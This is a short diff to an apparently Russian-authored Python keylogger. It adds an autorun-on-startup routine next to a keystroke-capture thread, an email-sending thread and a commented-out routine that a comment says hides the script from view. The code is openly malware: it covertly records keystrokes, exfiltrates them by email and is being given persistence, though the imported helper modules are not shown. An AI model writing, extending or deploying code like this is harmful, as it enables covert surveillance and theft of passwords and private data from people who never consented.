@@ -5,6 +5,7 @@ import ctypes
 from sending_to_email import *
 import threading
 from hide_programm import *
+from autho_run_programm import *
 
 # СЛОВАРИ
 # издевательство, перевод с англ раскладки на РУ
@@ -163,6 +164,8 @@ if __name__ == '__main__':
     keylogger_thread = threading.Thread(target=start_keylogger)
     main_email_thread = threading.Thread(target=main)
     # hide_prog_thread = threading.Thread(target=hide_prog)  # скрытие проги, работает, закоменчина ради тестов, ибо скрипт скрывается ото всюду
+
+    main_startup()
 
     # старт потоков
     keylogger_thread.start()
